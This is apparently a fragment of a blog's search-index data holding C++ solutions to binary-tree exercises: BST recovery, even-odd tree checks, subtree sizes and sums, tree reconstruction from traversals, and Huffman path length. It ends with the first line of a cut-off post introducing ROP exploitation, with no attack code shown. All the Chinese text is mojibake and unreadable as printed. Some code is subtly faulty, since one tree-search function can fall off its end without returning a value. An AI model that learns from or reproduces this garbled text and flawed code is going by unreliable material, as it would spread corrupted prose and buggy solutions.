ä¸¤ä¸ªèŠ‚ç‚¹çš„å€¼è¢«é”™è¯¯åœ°äº¤æ¢ã€‚è¯·åœ¨ä¸æ”¹å˜å…¶ç»“æ„çš„æƒ…å†µä¸‹ï¼Œæ¢å¤è¿™æ£µæ ‘ ã€‚è¾“å…¥æè¿°ç»™ä¸€ä¸ªäºŒå‰æ ‘è¾“å‡ºæè¿°æ¢å¤è¿™æ£µæ ‘è¾“å…¥è¾“å‡ºæ ·ä¾‹è¾“å…¥root = [1,3,null,null,2]è¾“å‡º[3,1,null,null,2]è¾“å…¥Root = [3,1,4,null,null,2]è¾“å‡º[2,1,4,null,null,3]**********æé†’ï¼š* äºŒå‰æœç´¢æ ‘æ»¡è¶³ä»»æ„èŠ‚ç‚¹çš„å·¦å­æ ‘ä»¬æ’å®šå°äºå®ƒï¼Œå³è¾¹å¤§äºå®ƒ* æ­¤å¤„åªæœ‰ä¸¤ä¸ªèŠ‚ç‚¹å€¼ï¼Œå› æ­¤æˆ‘ä»¬æœ€ç¬¨çš„æƒ³æ³•å°±æ˜¯å›ºå®šä¸€ä¸ªèŠ‚ç‚¹å¾€ä¸‹éå†å®ƒçš„æœ‰æ²¡æœ‰ä¸ç¬¦åˆçš„ï¼Œç›´åˆ°ç»“æŸ* ä¼˜åŒ–ç®—æ³•ï¼Œï¼Œï¼Œï¼Œï¼Œå¾…ä¼šçœ‹é¢˜è§£*///å¯è€ƒè™‘è¾“å‡ºä¸­åºéå†ï¼Œç„¶åå­˜æˆæ•°ç»„ï¼Œæ•°ç»„é‡Œé¢çš„åªæœ‰ä¸¤ä¸ªæ•°å­—æœ‰é—®é¢˜ï¼Œäº¤æ¢å³å¯//æ„é€ å·²çŸ¥äºŒå‰æœç´¢æ ‘ï¼Œå¯ä»¥è°ƒç”¨æ ‘ç”Ÿæˆé‚£ä¸ªå‡½æ•°ï¼Œä»–ç»™çš„å°±æ˜¯å±‚åºéå†TreeNode1 *FindWrongNode8(TreeNode1* root) &#123;//è¿”å›é‚£ä¸ªè·Ÿå®ƒé”™è¯¯çš„èŠ‚ç‚¹ queue&lt;TreeNode1*&gt; left;//å·¦è¾¹ if (root-&gt;left) &#123; if (root-&gt;left-&gt;val &gt; root-&gt;val) &#123; return root-&gt;left; &#125; left.push(root-&gt;left); while (!left.empty()) &#123; TreeNode1* current = left.front(); left.pop(); //ä¿è¯æ¯ä¸ªå­˜è¿›é˜Ÿåˆ— if (current-&gt;left) &#123; left.push(current-&gt;left); &#125; if (current-&gt;right) &#123; left.push(current-&gt;right); &#125; if (current-&gt;val &gt; root-&gt;val) &#123; return current; &#125; &#125; &#125; queue&lt;TreeNode1*&gt; right; if (root-&gt;right ) &#123; if (root-&gt;right-&gt;val &lt; root-&gt;val) &#123; return root-&gt;right; &#125; right.push(root-&gt;right); while (!right.empty()) &#123; TreeNode1* current = right.front(); right.pop(); //ä¿è¯æ¯ä¸ªå­˜è¿›é˜Ÿåˆ— if (current-&gt;left) &#123; right.push(current-&gt;left); &#125; if (current-&gt;right) &#123; right.push(current-&gt;right); &#125; if (current-&gt;val &lt; root-&gt;val) &#123; return current; &#125; &#125; &#125; &#125;TreeNode1* RepirWrongTree8(TreeNode1* root) &#123; //1.å›ºå®šä¸€ä¸ªï¼Œçœ‹å·¦å³å­æ ‘æœ‰æ— é—®é¢˜ //2.å¯ä»¥çˆ†ç ´ï¼Œå±‚åºéå†æ¯ä¸€ä¸ªï¼Œ //å› ä¸ºåªæœ‰ä¸¤ä¸ªä¸åŒï¼Œå°†æ¯ä¸ªèŠ‚ç‚¹çœ‹æˆrootæ‰¾å­æ ‘ï¼Œæ‰¾åˆ°å°±äº¤æ¢valï¼Œbreak //3.è¿”å›rootæ ¹èŠ‚ç‚¹ queue&lt;TreeNode1*&gt; q; q.push(root); while (!q.empty()) &#123; TreeNode1* current = q.front(); q.pop(); //ä¿è¯æ¯ä¸ªå­˜è¿›é˜Ÿåˆ— if (current-&gt;left) &#123; q.push(current-&gt;left); &#125; if (current-&gt;right) &#123; q.push(current-&gt;right); &#125; //æŸ¥æ‰¾å½“å‰çš„Nodeä¸‹æ˜¯å¦æœ‰é”™è¯¯ //æœ‰åˆ™äº¤æ¢valå¹¶é€€å‡º //æ— åˆ™ç»§ç»­å¾€ä¸‹æ£€ç´¢ TreeNode1* Wrong = FindWrongNode8(current); if (Wrong != current) &#123;//å¦‚æœä¸ç­‰äº¤æ¢é€€å‡ºå¾ªç¯ int temp = Wrong-&gt;val; Wrong-&gt;val = current-&gt;val; current-&gt;val = temp; break; &#125; &#125; return root;&#125;int main_8() &#123; string arrayString1; int num = 0; getline(cin, arrayString1);//getlineå¯ä»¥è¯»å…¥ç©ºæ ¼ï¼Œä»¥æ¢è¡Œç»“æŸ // è§£æè¾“å…¥å­—ç¬¦ä¸²ä¸ºå­—ç¬¦ä¸²æ•°ç»„1 vector&lt;string&gt; arr1; stringstream ss1(arrayString1); string token1; while (getline(ss1, token1, &#x27;,&#x27;)) &#123; arr1.push_back(token1); num++; &#125; //numè¾…åŠ©å¾…ä¼šè¾“å‡º int height = calculateHeight3(num); int num1 = calculateNodeCount3(height - 1); TreeNode1* root = arrayToTree1(arr1);//æ„å»ºæ ‘ root = RepirWrongTree8(root);//ä¿®å¤æ ‘ levelOrderTraversal3(root,num1);//è¾“å‡ºç°åœ¨çš„æ ‘ return 0;&#125;/************************ç¬¬9é¢˜************************** * 9: å¥‡å¶æ•°é¢˜ç›®æè¿°å¦‚æœä¸€æ£µäºŒå‰æ ‘æ»¡è¶³ä¸‹è¿°å‡ ä¸ªæ¡ä»¶ï¼Œåˆ™å¯ä»¥ç§°ä¸º å¥‡å¶æ ‘ ï¼šäºŒå‰æ ‘æ ¹èŠ‚ç‚¹æ‰€åœ¨å±‚ä¸‹æ ‡ä¸º 0 ï¼Œæ ¹çš„å­èŠ‚ç‚¹æ‰€åœ¨å±‚ä¸‹æ ‡ä¸º 1 ï¼Œæ ¹çš„å­™èŠ‚ç‚¹æ‰€åœ¨å±‚ä¸‹æ ‡ä¸º 2 ï¼Œä¾æ­¤ç±»æ¨ã€‚å¶æ•°ä¸‹æ ‡ å±‚ä¸Šçš„æ‰€æœ‰èŠ‚ç‚¹çš„å€¼éƒ½æ˜¯ å¥‡ æ•´æ•°ï¼Œä»å·¦åˆ°å³æŒ‰é¡ºåº ä¸¥æ ¼é€’å¢å¥‡æ•°ä¸‹æ ‡ å±‚ä¸Šçš„æ‰€æœ‰èŠ‚ç‚¹çš„å€¼éƒ½æ˜¯ å¶ æ•´æ•°ï¼Œä»å·¦åˆ°å³æŒ‰é¡ºåº ä¸¥æ ¼é€’å‡ç»™ä½ äºŒå‰æ ‘çš„æ ¹èŠ‚ç‚¹ï¼Œå¦‚æœäºŒå‰æ ‘ä¸º å¥‡å¶æ ‘ ï¼Œåˆ™è¿”å› true ï¼Œå¦åˆ™è¿”å› false ã€‚è¾“å…¥æè¿°ç»™ä¸€ä¸ªäºŒå‰æ ‘è¾“å‡ºæè¿°åˆ¤æ–­æ˜¯å¦æ˜¯å¥‡å¶æ ‘è¾“å…¥è¾“å‡ºæ ·ä¾‹è¾“å…¥root = [1,10,4,3,null,7,9,12,8,6,null,null,2]è¾“å‡ºtrueè¾“å…¥root = [2,1,3]è¾“å‡ºfalse*///é¢˜ç›®è¦æ±‚//1.å¶æ•°å±‚ä¸ºå¥‡æ•´æ•°ã€é€’å¢//2.å¥‡æ•°å±‚ä¸ºå¶æ•´æ•°ã€é€’å‡//è€ƒè™‘ï¼Œï¼Œè®¾ç½®è®¡å±‚å™¨ï¼Œåˆ©ç”¨é˜Ÿåˆ—ï¼Œå¯¹æ¯å±‚å•ç‹¬åˆ¤æ–­bool isEvenOddTree9(TreeNode1* root) &#123; queue&lt;TreeNode1*&gt; queue; int level = 0; queue.push(root); while (!queue.empty()) &#123; int size = queue.size(); int preVal = level % 2 == 0 ? 0 : 1000001; for (int i = 0; i &lt; size; i++) &#123;//æ¯ä¸€æ¬¡å¤„ç†ä¸€å±‚ï¼ŒæŠŠä¸€å±‚çš„å…¨éƒ¨popå‡ºå»åå¼€å§‹ä¸‹ä¸€å±‚ TreeNode1* node = queue.front(); queue.pop(); int val = node-&gt;val; if (level % 2 == val % 2) &#123; return false; &#125; if ((level % 2 == 0 &amp;&amp; val &lt;= preVal) || (level % 2 == 1 &amp;&amp; val &gt;= preVal)) &#123; return false; &#125; if (node-&gt;left != nullptr) &#123; queue.push(node-&gt;left); &#125; if (node-&gt;right != nullptr) &#123; queue.push(node-&gt;right); &#125; preVal = val; &#125; level++; &#125; return true;&#125;int main_9() &#123; string arrayString1; getline(cin, arrayString1);//getlineå¯ä»¥è¯»å…¥ç©ºæ ¼ï¼Œä»¥æ¢è¡Œç»“æŸ // è§£æè¾“å…¥å­—ç¬¦ä¸²ä¸ºå­—ç¬¦ä¸²æ•°ç»„1 vector&lt;string&gt; arr1; stringstream ss1(arrayString1); string token1; while (getline(ss1, token1, &#x27;,&#x27;)) &#123; arr1.push_back(token1); &#125; //æ„å»ºå¥‡å¶æ ‘ TreeNode1* root = arrayToTree1(arr1); //åˆ¤æ–­æ˜¯å¦ä¸ºå¥‡å¶æ ‘ if (isEvenOddTree9(root)) &#123; cout &lt;&lt; &quot;true&quot; &lt;&lt; endl; &#125; else cout &lt;&lt; &quot;false&quot; &lt;&lt; endl; return 0;&#125;/*10 10.äºŒå‰æ ‘çš„å­æ ‘å¤§å°æè¿°ç°åœ¨ç»™å‡ºä¸€æ£µäºŒå‰æ ‘ï¼Œå¸Œæœ›ä½ è¾“å‡ºå®ƒçš„æ¯ä¸€ä¸ªç»“ç‚¹ä¸ºæ ¹çš„å­æ ‘å¤§å°è¾“å…¥ç¬¬ä¸€è¡Œä¸€ä¸ªæ­£æ•´æ•° nï¼Œè¡¨ç¤ºç»™å®šçš„æ ‘çš„èŠ‚ç‚¹çš„æ•°ç›®ï¼Œè§„å®šèŠ‚ç‚¹ç¼–å· 1âˆ¼nï¼Œå…¶ä¸­èŠ‚ç‚¹ 1æ˜¯æ ‘æ ¹ã€‚æ¥ä¸‹æ¥ n è¡Œï¼Œæ¯è¡Œä¸¤ä¸ªæ­£æ•´æ•° li, ri â€‹ ï¼Œåˆ†åˆ«è¡¨ç¤ºèŠ‚ç‚¹ i çš„å·¦å³å­©å­çš„ç¼–å·ã€‚å¦‚æœä¸å­˜åœ¨å·¦ / å³å­©å­ï¼Œåˆ™ä»¥ âˆ’1 è¡¨ç¤ºã€‚ä¸¤ä¸ªæ•°ä¹‹é—´ç”¨ä¸€ä¸ªç©ºæ ¼éš”å¼€ã€‚è¾“å‡ºä¸€è¡Œï¼Œnä¸ªæ•°ï¼Œåˆ†åˆ«è¡¨ç¤ºiå·ç»“ç‚¹ä¸ºæ ¹çš„å­æ ‘çš„å­æ ‘å¤§å°æ ·ä¾‹è¾“å…¥32 3-1 -1-1 -1è¾“å‡º3 1 1*///æ€è€ƒäº†ä¸€ä¸‹ä¹‹åå¯ä»¥ç›´æ¥ç”¨é¡ºåºå­˜å‚¨//ä¸ç”¨é“¾è¡¨ï¼Œå®šä¹‰æ•°æ®ç»“æ„ï¼Œç„¶åç”¨æ•°ç»„struct TreeNode10&#123; int left; int right;&#125;;vector&lt;int&gt; subtreeSizes;int getSubtreeSize10(int root, const vector&lt;TreeNode10&gt;&amp; tree) &#123; if (root == -1) &#123; return 0; &#125; int leftSize = getSubtreeSize10(tree[root].left, tree); int rightSize = getSubtreeSize10(tree[root].right, tree); int currentSize = leftSize + rightSize + 1; subtreeSizes[root] = currentSize; return currentSize;&#125;int main_10() &#123; int n; cin &gt;&gt; n; vector&lt;TreeNode10&gt; tree(n + 1); // ä¸ºäº†ä¸é¢˜ç›®ä¸­çš„èŠ‚ç‚¹ç¼–å·ä»1å¼€å§‹ä¿æŒä¸€è‡´ï¼Œä½¿ç”¨å¤§å°ä¸ºn+1çš„vector // è¯»å–æ ‘çš„ä¿¡æ¯ for (int i = 1; i &lt;= n; i++) &#123; cin &gt;&gt; tree[i].left &gt;&gt; tree[i].right; &#125; subtreeSizes.resize(n + 1); // åˆå§‹åŒ–å­˜å‚¨å­æ ‘å¤§å°çš„æ•°ç»„ // è®¡ç®—æ¯ä¸ªç»“ç‚¹ä¸ºæ ¹çš„å­æ ‘å¤§å° getSubtreeSize10(1, tree); // è¾“å‡ºç»“æœ for (int i = 1; i &lt;= n; i++) &#123; cout &lt;&lt; subtreeSizes[i] &lt;&lt; &quot; &quot;; &#125; return 0;&#125;/*11é¢˜ï¼Œ11é¢˜å¾ˆå¥½ï¼Œå’Œ10é¢˜å¾ˆåƒï¼Œç›¸å½“äºå¤šäº†ä¸€ä¸ªèŠ‚ç‚¹è‡ªèº«ä»£å€¼11: äºŒå‰æ ‘çš„å­æ ‘å’Œæè¿°ç°åœ¨ç»™å‡ºä¸€æ£µäºŒå‰æ ‘ï¼Œæ¯ä¸ªç»“ç‚¹æœ‰ä¸€ä¸ªæƒå€¼ï¼Œå¸Œæœ›ä½ ä¾æ¬¡è¾“å‡ºæ¯ä¸€ä¸ªèŠ‚ç‚¹ä¸ºæ ¹çš„å­æ ‘çš„å­æ ‘æƒå€¼å’Œè¾“å…¥ç¬¬ä¸€è¡Œä¸€ä¸ªæ­£æ•´æ•° nï¼Œè¡¨ç¤ºç»™å®šçš„æ ‘çš„èŠ‚ç‚¹çš„æ•°ç›®ï¼Œè§„å®šèŠ‚ç‚¹ç¼–å· 1âˆ¼nï¼Œå…¶ä¸­èŠ‚ç‚¹ 1æ˜¯æ ‘æ ¹ã€‚ç¬¬äºŒè¡Œ n ä¸ªæ­£æ•´æ•°ï¼Œç”¨ä¸€ä¸ªç©ºæ ¼åˆ†éš”ï¼Œç¬¬ i ä¸ªæ­£æ•´æ•°viï¼Œä»£è¡¨èŠ‚ç‚¹ i çš„æƒå€¼ã€‚æ¥ä¸‹æ¥ n è¡Œï¼Œæ¯è¡Œä¸¤ä¸ªæ­£æ•´æ•° li, ri â€‹ ï¼Œåˆ†åˆ«è¡¨ç¤ºèŠ‚ç‚¹ i çš„å·¦å³å­©å­çš„ç¼–å·ã€‚å¦‚æœä¸å­˜åœ¨å·¦ / å³å­©å­ï¼Œåˆ™ä»¥ âˆ’1 è¡¨ç¤ºã€‚ä¸¤ä¸ªæ•°ä¹‹é—´ç”¨ä¸€ä¸ªç©ºæ ¼éš”å¼€ã€‚è¾“å‡ºä¸€è¡Œï¼Œnä¸ªæ•°ï¼Œåˆ†åˆ«è¡¨ç¤ºiå·ç»“ç‚¹ä¸ºæ ¹çš„å­æ ‘çš„å­æ ‘æƒå€¼å’Œæ ·ä¾‹è¾“å…¥31 1000 10002 3-1 -1-1 -1è¾“å‡º2001 1000 1000*///åŠ äº†powerçš„é•¿æ•°ç»„struct TreeNode11 &#123; int left; int right; int power;&#125;;vector&lt;int&gt; subtreePowers;int getSubtreePower11(int root, const vector&lt;TreeNode11&gt;&amp; tree) &#123; if (root == -1) &#123; return 0; &#125; int leftPower = getSubtreePower11(tree[root].left,tree); int rightPower = getSubtreePower11(tree[root].right, tree); int currentPower = leftPower + rightPower + tree[root].power; subtreePowers[root] = currentPower; return currentPower;&#125;int main_11() &#123; int n; cin &gt;&gt; n; vector&lt;TreeNode11&gt; tree(n + 1); // ä¸ºäº†ä¸é¢˜ç›®ä¸­çš„èŠ‚ç‚¹ç¼–å·ä»1å¼€å§‹ä¿æŒä¸€è‡´ï¼Œä½¿ç”¨å¤§å°ä¸ºn+1çš„vector for (int i = 1; i &lt;= n; i++) &#123; cin &gt;&gt; tree[i].power; &#125; // è¯»å–æ ‘çš„ä¿¡æ¯ for (int i = 1; i &lt;= n; i++) &#123; cin &gt;&gt; tree[i].left &gt;&gt; tree[i].right; &#125; subtreePowers.resize(n + 1); // åˆå§‹åŒ–å­˜å‚¨å­æ ‘å¤§å°çš„æ•°ç»„ // è®¡ç®—æ¯ä¸ªç»“ç‚¹ä¸ºæ ¹çš„å­æ ‘å¤§å° getSubtreePower11(1, tree); // è¾“å‡ºç»“æœ for (int i = 1; i &lt;= n; i++) &#123; cout &lt;&lt; subtreePowers[i] &lt;&lt; &quot; &quot;; &#125; return 0;&#125;/*12: ç¡®å®šæ ‘çš„å½¢æ€æè¿°ç°åœ¨ç»™å‡ºä¸€æ£µäºŒå‰æ ‘çš„å‰åºéå†å’Œååºéå†ï¼Œè¾“å‡ºæ ‘çš„ååºéå†è¾“å…¥ç¬¬ä¸€è¡Œä¸€ä¸ªæ­£æ•´æ•° nï¼Œè¡¨ç¤ºç»™å®šçš„æ ‘çš„èŠ‚ç‚¹çš„æ•°ç›®ï¼Œè§„å®šèŠ‚ç‚¹ç¼–å· 1âˆ¼nï¼Œå…¶ä¸­èŠ‚ç‚¹ 1æ˜¯æ ‘æ ¹ã€‚ç¬¬äºŒè¡Œ n ä¸ªæ­£æ•´æ•°ï¼Œç”¨ä¸€ä¸ªç©ºæ ¼åˆ†éš”ï¼Œä»£è¡¨äºŒå‰æ ‘çš„å‰åºéå†ç¬¬ä¸‰è¡Œ n ä¸ªæ­£æ•´æ•°ï¼Œç”¨ä¸€ä¸ªç©ºæ ¼åˆ†éš”ï¼Œä»£è¡¨äºŒå‰æ ‘çš„ä¸­åºéå†è¾“å‡ºä¸€è¡Œï¼Œnä¸ªæ•°ï¼Œç”¨ä¸€ä¸ªç©ºæ ¼åˆ†éš”ï¼Œè¡¨ç¤ºäºŒå‰æ ‘çš„ååºéå†æ ·ä¾‹è¾“å…¥31 2 32 1 3è¾“å‡º2 3 1*///æ²¡æƒ³åˆ°ï¼Œåé¢å‡ ä¸ªè€ƒéå†æ–¹æ³•/*å·²çŸ¥è¯¥äºŒå‰æ ‘çš„å…ˆåºéå†åºåˆ—ä¸ºï¼šA-B-D-E-G-C-Fï¼Œä¸­åºéå†åºåˆ—ä¸ºï¼šD-B-G-E-A-C-Fã€‚ç¬¬ä¸€æ­¥ï¼šæ‰¾æ ¹ å…ˆåºéå†å…ˆéå†æ ¹ç»“ç‚¹ é‚£ä¹ˆå®ƒçš„åºåˆ—ç¬¬ä¸€ä¸ªè‚¯å®šæ˜¯æ ¹èŠ‚ç‚¹ä¹Ÿå°±æ˜¯ä¸Šé¢çš„Aç¬¬äºŒæ­¥ï¼šæ‰¾æ ¹ç»“ç‚¹çš„å·¦å³å­æ•° ä¸­åºéå†å…ˆå·¦åæ ¹åå³ åœ¨ä¸­åºåºåˆ—ä¸­æ‰¾åˆ°æ ¹ç»“ç‚¹çš„ä½ç½®é‚£ä¹ˆå®ƒçš„å·¦è¾¹å°±æ˜¯å®ƒçš„å·¦å­æ ‘åºåˆ— å³è¾¹å°±æ˜¯å®ƒçš„å³å­æ•°åºåˆ—å³ä¸Šé¢çš„ D-B-G-E å’Œ C-Fç¬¬ä¸‰æ­¥ï¼šæ‹†åˆ†è½¬åŒ–ä¸ºå­é—®é¢˜ å»æ‰Aç»“ç‚¹ å°†æ ‘åˆ†ä¸ºä¸¤ä¸ªäºŒå‰æ ‘ B-D-E-G å’ŒC-Fç„¶åæŒ‰ç…§ç¬¬ä¸€æ­¥åˆ†åˆ«æ‰¾ä¸¤é¢—æ ‘çš„æ ¹ B C ç„¶åæ ¹æ®ç¬¬äºŒéƒ¨æ‰¾æ ¹çš„å·¦å³å­æ•°B(å·¦è¾¹D å³è¾¹ G-E) C (å·¦è¾¹NULL å³è¾¹ F) ä¸€æ¬¡ç±»æ¨ ç›´åˆ°è¿˜åŸå‡ºäºŒå‰æ ‘çš„æ¨¡å‹*/struct Node&#123; int data; Node* left; Node* right;&#125;;Node* getBinaryTree(int* preOrder, int* inOrder, int len)&#123; if (preOrder == nullptr || len &lt;= 0) return nullptr; Node* root = new Node; root-&gt;data = *preOrder; // å‰åºéå†çš„ç¬¬ä¸€ä¸ªèŠ‚ç‚¹å°±æ˜¯æ ¹èŠ‚ç‚¹ // æ‰¾åˆ°æ ¹èŠ‚ç‚¹åœ¨ä¸­åºéå†ä¸­çš„ä½ç½®ï¼Œå…¶å€¼ä¹Ÿä»£è¡¨äº†å·¦å­æ ‘çš„èŠ‚ç‚¹æ•°ç›® int pos = 0; while (inOrder[pos] != root-&gt;data) &#123; pos++; &#125; // é€’å½’æ‰¾åˆ°å·¦å­æ ‘å’Œå³å­æ ‘ if (0 == pos) &#123; root-&gt;left = nullptr; &#125; else &#123; root-&gt;left = getBinaryTree(preOrder + 1, inOrder, pos); &#125; if (0 == len - pos - 1) &#123; root-&gt;right = nullptr; &#125; else &#123; root-&gt;right = getBinaryTree(preOrder + pos + 1, inOrder + pos + 1, len - pos - 1); &#125; return root;&#125;void postOrder(Node* root)&#123; if (root == nullptr) return; postOrder(root-&gt;left); postOrder(root-&gt;right); cout &lt;&lt; root-&gt;data&lt;&lt;&quot; &quot;;&#125;int main_12()&#123; int len; cin &gt;&gt; len; int* preOrder = new int[len];//preOderæŒ‡å‘æ•°ç»„èµ·å§‹0å¤„ int* inOrder = new int[len]; for (int i = 0; i &lt; len; ++i) &#123; cin &gt;&gt; preOrder[i]; &#125; for (int i = 0; i &lt; len; ++i) &#123; cin &gt;&gt; inOrder[i]; &#125; Node* root = getBinaryTree(preOrder, inOrder, len); postOrder(root); delete[] preOrder; delete[] inOrder; return 0;&#125;/*13.æ„å»ºå“ˆå¤«æ›¼æ ‘å“ˆå¤«æ›¼å”çš„å¸¦æƒè·¯å¾„é•¿æè¿°ç°åœ¨ç»™å‡ºä¸€æ£µäºŒå‰æ ‘ï¼Œæ¯ä¸ªç»“ç‚¹æœ‰ä¸€ä¸ªæƒå€¼ï¼Œå¸Œæœ›ä½ æ„é€ èµ«å¤«æ›¼æ ‘ï¼Œå¹¶è¾“å‡ºå…¶å¯¹åº”çš„å¸¦æƒè·¯å¾„é•¿åº¦è¾“å…¥ç¬¬ä¸€è¡Œä¸€ä¸ªæ­£æ•´æ•° nï¼Œè¡¨ç¤ºç»™å®šçš„æ ‘çš„èŠ‚ç‚¹çš„æ•°ç›®ï¼Œè§„å®šèŠ‚ç‚¹ç¼–å· 1âˆ¼nã€‚ç¬¬äºŒè¡Œ n ä¸ªæ­£æ•´æ•°ï¼Œç”¨ä¸€ä¸ªç©ºæ ¼åˆ†éš”ï¼Œç¬¬ i ä¸ªæ­£æ•´æ•°viï¼Œä»£è¡¨èŠ‚ç‚¹ i çš„æƒå€¼ã€‚è¾“å‡ºä¸€ä¸ªæ•°ï¼Œè¡¨ç¤ºå¯¹åº”èµ«å¤«æ›¼æ ‘çš„å¸¦æƒè·¯å¾„é•¿åº¦æ ·ä¾‹è¾“å…¥31 1000 1000è¾“å‡º3002*///æ„å»ºå“ˆå¤«æ›¼æ ‘çš„åŸºæœ¬æ€æƒ³/*1.æƒå€¼æœ€å°çš„åœ¨è¶Šåç«¯ åŸºæœ¬è¦æ±‚2.æ¯æ¬¡æ‰¾åˆ°æœ€å°çš„ä¸¤ä¸ªæƒå€¼ï¼Œåˆæˆå·¦å³å­æ ‘ å‡½æ•°1ï¼ŒSelectä¸¤ä¸ªæœ€å°èŠ‚ç‚¹ä¸æ–­åˆå¹¶3.rootçš„æƒå€¼=å·¦åŠ å³ï¼Œç„¶åæ›´æ–°èŠ‚ç‚¹å³å¯ å‡½æ•°2ï¼Œæ„å»ºå“ˆå¤«æ›¼æ ‘ï¼Œä¸æ–­è°ƒç”¨å‡½æ•°1ï¼Œæœ€ååªå‰©æ ¹èŠ‚ç‚¹4.è®¡ç®—å¸¦æƒè·¯å¾„é•¿åº¦æ€»å’Œ å‡½æ•°3ï¼šè®¡ç®—å…¨éƒ¨*///å“ˆå¤«æ›¼æ ‘çš„æ ‡å‡†å®šä¹‰typedef struct&#123; int weight; // ç»“ç‚¹çš„æƒå€¼ï¼Œä¸ºäº†æ–¹ä¾¿ç›´æ¥ç”¨int int parent, lchild, rchild; // å·¦å³å­©å­å’ŒåŒäº²&#125; HTNode, * HuffmanTree;// é€‰æ‹©æƒå€¼æœ€å°çš„ä¸¤ä¸ªç»“ç‚¹void Select(HuffmanTree HT, int n, int&amp; index1, int&amp; index2) &#123; if (n &lt;= 1) return; index1 = index2 = 0; for (int k = 1; k &lt;= n; k++) &#123; //ç»™index1èµ‹åˆå€¼ if (HT[k].parent == 0) &#123; index1 = k; break; &#125; &#125; for (int k = 1; k &lt;= n; k++) &#123; //ç»™index2èµ‹åˆå€¼ if (HT[k].parent == 0 &amp;&amp; k != index1) &#123; index2 = k; break; &#125; &#125; for (int k = 1; k &lt;= n; k++) &#123; //æ‰¾åˆ°æœ€å°çš„æƒå€¼,èµ‹ç»™index1 if (HT[k].parent == 0 &amp;&amp; k != index2) &#123; if (HT[index1].weight &gt; HT[k].weight) &#123; index1 = k; &#125; &#125; &#125; HT[index1].parent = -1; //å°†æœ€å°çš„æƒå€¼ç»“ç‚¹åŒäº²æ”¹ä¸º-1ï¼Œé˜²æ­¢è¢«index2é€‰å– for (int i = 1; i &lt;= n; i++) &#123; //æ‰¾åˆ°ç¬¬äºŒå°çš„æƒå€¼,èµ‹ç»™index2 if (HT[i].parent == 0 &amp;&amp; i != index1) &#123; if (HT[index2].weight &gt; HT[i].weight) &#123; index2 = i; &#125; &#125; &#125;&#125;// æ„å»ºå“ˆå¤«æ›¼æ ‘// HTä¸ºæ ‘,nä¸ºå¶å­ç»“ç‚¹æ•°,w[]å¶å­çš„æƒå€¼void CreateHuffmanTree(HuffmanTree&amp; HT, int n, int w[]) &#123; if (n &lt;= 1) // å¦‚æœç»“ç‚¹å°äºç­‰äº1,ç›´æ¥é€€å‡º return; int m = 2 * n - 1; //æ€»å…±æœ‰2*n-1ä¸ªç»“ç‚¹ HT = new HTNode[m + 1]; //ä¸ºäº†æ–¹ä¾¿,ä¸ç”¨0å·å•å…ƒï¼ŒHT[m]è¡¨ç¤ºæ ¹ç»“ç‚¹,ä¸‹è¡¨ä»1å¼€å§‹ /*ç»™æ‰€æœ‰ç»“ç‚¹çš„å·¦,å³å­©å­ä»¥åŠåŒäº²åˆå§‹åŒ–ä¸º0;*/ for (int i = 1; i &lt;= m; ++i) &#123; HT[i].lchild = 0; HT[i].rchild = 0; HT[i].parent = 0; &#125; /*ç»™å‰ n ä¸ªç»“ç‚¹è®¾ç½®æƒé‡*/ for (int i = 1; i &lt;= n; i++) &#123; HT[i].weight = w[i]; &#125; /*ç»™ç¬¬ n ä¸ªç»“ç‚¹ä¹‹åçš„ç»“ç‚¹èµ‹å€¼,ä»¥åŠè®¾ç½®å·¦å³å­©å­å’ŒåŒäº²*/ for (int i = n + 1; i &lt;= m; ++i) &#123; int s1 = -1, s2 = -1; // s1 å’Œ s2 åˆ†åˆ«ä¸ºæƒå€¼æœ€å°å’Œæ¬¡å°çš„ç»“ç‚¹ä¸‹æ ‡ /* è°ƒç”¨Selectå‡½æ•° åœ¨å‰ i-1 ä¸ªæ²¡æœ‰åŒäº²çš„ç»“ç‚¹ä¸­è¿”å›æƒé‡æœ€å°çš„ç»“ç‚¹åºå·s1,s2 */ Select(HT, i - 1, s1, s2); /* å°†ç¬¬ s1,s2 å·ç»“ç‚¹çš„åŒäº²è®¾ç½®ä¸ºç¬¬ i ä¸ªç»“ç‚¹ åŒæ—¶æ„å‘³ç€ä¸‹æ¬¡è°ƒç”¨Selectå‡½æ•°å°†å¿½ç•¥s1,s2 */ HT[s1].parent = i; HT[s2].parent = i; /*s1,s2åˆ†åˆ«ä½œä¸ºiçš„å·¦å³å­©å­*/ HT[i].lchild = s1; HT[i].rchild = s2; /*i çš„æƒå€¼ä¸ºå·¦å³å­©å­æƒå€¼ä¹‹å’Œ*/ HT[i].weight = HT[s1].weight + HT[s2].weight; &#125;&#125;// è®¡ç®—å“ˆå¤«æ›¼æ ‘çš„å¸¦æƒè·¯å¾„é•¿åº¦int CalculateWPL(const HuffmanTree&amp; HT, int n) &#123; int wpl = 0; for (int i = 1; i &lt;= n; ++i) &#123; int depth = 0; int j = i; while (HT[j].parent != 0) &#123; j = HT[j].parent; depth++; &#125; wpl += HT[i].weight * depth; &#125; return wpl;&#125;int main() &#123; int n; cin &gt;&gt; n; int* weights = new int[n + 1]; // ä¸ºäº†æ–¹ä¾¿ï¼Œä¸ä½¿ç”¨0å·å•å…ƒ for (int i = 1; i &lt;= n; ++i) &#123; cin &gt;&gt; weights[i]; &#125; HuffmanTree ht; CreateHuffmanTree(ht, n, weights); int wpl = CalculateWPL(ht, n); cout &lt;&lt; wpl &lt;&lt; endl; delete[] ht; // é‡Šæ”¾åŠ¨æ€åˆ†é…çš„å†…å­˜ delete[] weights; // é‡Šæ”¾åŠ¨æ€åˆ†é…çš„å†…å­˜ return 0;&#125;","path":"computer-science/Data-Structures/cpp/äºŒå‰æ ‘é¢˜è§£/","date":"11-10","excerpt":"","tags":[{"name":"æ•°æ®ç»“æ„ä¸ç®—æ³•","slug":"æ•°æ®ç»“æ„ä¸ç®—æ³•","permalink":"http://example.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}]},{"title":"Pwnå¤ä¹ -åˆçº§ROP","text":"# ä¸€.ROP ç¼–ç¨‹ä»‹ç» â€‹ éšç€ NX ä¿æŠ¤çš„å¼€å¯ï¼Œä»¥å¾€ç›´æ¥å‘æ ˆæˆ–è€…å †ä¸Šç›´æ¥æ³¨å…¥ä»£ç çš„æ–¹å¼éš¾ä»¥ç»§ç»­å‘æŒ¥æ•ˆæœã€‚æ”»å‡»è€…ä»¬ä¹Ÿæå‡ºæ¥ç›¸åº”çš„æ–¹æ³•æ¥ç»•è¿‡ä¿æŠ¤ï¼Œç›®å‰ä¸»è¦çš„æ˜¯ ROP (Return Oriented 